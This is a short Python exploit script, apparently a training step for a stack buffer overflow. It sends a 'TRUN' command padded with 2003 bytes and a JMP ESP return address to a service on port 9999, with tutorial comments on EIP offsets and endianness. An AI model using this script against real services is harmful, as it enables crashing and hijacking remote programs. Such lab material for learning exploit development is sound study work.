#!/usr/bin/python3

import sys, socket 

#Sending 2003 As to identify where the EIP starts based on the offset we found finding the offset, then validating that teh EIP reads [42424242]
shellcode = "A" * 2003 + "\xaf\x11\x50\x62"  

#The return address gets added to the end of the code to check whether or not it points to the ESP.
#You'll cycle through each of the return addresses found in immunity debuggerto find JMP ESP
#You'll notice that the return address is in reverse ; this is because x86 architecture uses Little Endian
#Format by storing the low order byte at the lowest address and the high order byte at the highest address

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('111.222.333.444', 9999))
	
	payload = "TRUN /.:/" + shellcode
	
	s.send((payload.encode())) #The extra characters go in after the TRUN command in order for the program to undesrstand it
	s.close()
		
except:
	print ("Error Connecting to Server")
	sys.exit()
